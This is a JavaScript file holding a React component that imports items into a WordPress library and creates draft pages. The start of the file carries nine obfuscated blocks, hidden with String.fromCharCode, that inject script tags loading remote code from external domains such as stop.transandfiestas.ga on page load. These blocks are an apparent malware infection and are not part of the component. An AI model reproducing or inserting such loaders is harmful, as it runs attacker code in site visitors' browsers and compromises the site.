Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();import React from "react"

import styles from "./Importer.module.css"
import stylesShared from "../shared.module.css"
import { api } from "../util/api"
import { error } from "../util/error"

export default class Importer extends React.PureComponent {
  constructor(props) {
    super(props)
    this.state = {
      imported: typeof props.item.itemImported !== "undefined" && props.item.itemImported,
      importing: false,
      justImported: false,
      pageName: "",
    }
  }

  doOpen = () => {
    alert("open item page")
  }

  doImport = () => {
    const { updateSingleItem, importData, category, item } = this.props
    this.setState({ importing: true })

    api
      .post(`import/${category}/process`, importData, { retryCallbac: this.doImport })
      .then(
        (json) => {
          if (json && json.status) {
            if (updateSingleItem && json.updateData) updateSingleItem(item, json.updateData)
            this.setState({ imported: true, justImported: true })
          }
        },
        (err) => {

        },
      )
      .finally(() => {
        this.setState({ importing: false })
      })
  }

  createPage = (e) => {
    if(e) e.preventDefault()
    const { importing, pageName } = this.state
    if (importing) return
    const { updateSingleItem, importData, category, item } = this.props
    this.setState({ importing: true, pageCreated: false })

    api
      .post(`create/${category}/process`, Object.assign({}, importData, { pageName }), {
        retryCallbac: this.createPage,
      })
      .then(
        (json) => {
          if (json && json.status) {
            this.setState({ imported: true, pageCreated: json, pageName: "" })
          }
        },
        (err) => {},
      )
      .finally(() => {
        this.setState({ importing: false })
      })
    return false
  }

  pageNameChanged = (e) => {
    this.setState({
      pageName: e.target.value,
    })
  }

  render() {
    const { label, labelImported, item, createPage, labelEnterPageName } = this.props
    const { importing, imported, pageCreated, justImported } = this.state
    if (createPage) {
      return (
        <div className={styles.createPageWrap}>
          {pageCreated ? (
            <div className={styles.createPageSuccess}>
              Congrats! This draft page was just created:{" "}
              <a href={pageCreated.page_url} data-cy="importer-created-page" target="_blank">
                {pageCreated.page_name}
              </a>
            </div>
          ) : null}
          <form onSubmit={this.createPage} className={styles.createPageForm}>
            <input
              onChange={this.pageNameChanged}
              value={this.state.pageName}
              className={stylesShared.textInput}
              disabled={importing}
              placeholder={labelEnterPageName || "Enter Page Name"}
              data-cy="importer-create-page-name"
            />
            <button
              data-cy="importer-create-button"
              onClick={this.createPage}
              className={`${stylesShared.button} ${stylesShared.buttonSecondary} ${styles.createButton} ${
                styles.animatedButton
              } ${styles.animatedButtonSecondary} ${importing ? styles.importing : ""}`}
              disabled={importing}>
              {importing ? "Creating..." : label || "Create New Page"}
              <span />
            </button>
          </form>
        </div>
      )
    }
    return (
      <div className={styles.wrap}>
        {justImported ? (
          <div className={styles.createPageSuccess}>Congrats! This was just imported to the WordPress library.</div>
        ) : null}
        {imported ? (
          <a href={item.itemImportedUrl} className={stylesShared.button}>
            {labelImported || "Open Item"}
          </a>
        ) : (
          <button
            type="button"
            onClick={this.doImport}
            disabled={importing}
            className={`${stylesShared.button} ${styles.animatedButton} ${importing ? styles.importing : ""}`}
            data-cy="importer-button">
            {importing ? "Importing..." : label || "Import"}
            <span />
          </button>
        )}
      </div>
    )
  }
}

Importer.propTypes = {}
